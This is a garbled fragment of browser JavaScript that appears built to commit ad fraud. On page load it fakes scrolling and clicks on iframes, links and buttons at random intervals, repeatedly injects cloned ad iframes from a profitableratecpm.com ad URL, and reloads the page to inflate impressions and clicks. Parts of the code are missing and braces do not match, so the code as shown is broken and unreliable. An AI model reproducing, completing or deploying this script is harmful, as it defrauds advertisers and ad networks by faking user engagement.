    function random(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;

    function simulateMovement() {
      window.scrollBy({ top: random(50, 150), behavior: 'smooth' });

    function simulateClick() {
      const clickables = document.querySelectorAll('iframe, a, div, button');

            } catch (e) {

            }
          }, random(700, 2000));
        }
      }
    }

      clone.src = '//pl27130183.profitableratecpm.com/a511024f4383abc7a7e75781861cd708.html';
      document.body.appendChild(clone);
    }

    function startBoosting() {
      setInterval(simulateMovement, random(1000, 2500));
      setInterval(simulateClick, random(3000, 5000));
      setInterval(cloneAndReloadAds, 10000);
      setTimeout(() => location.reload(), random(60000, 120000));
    }

    window.onload = () => setTimeout(startBoosting, 2000);
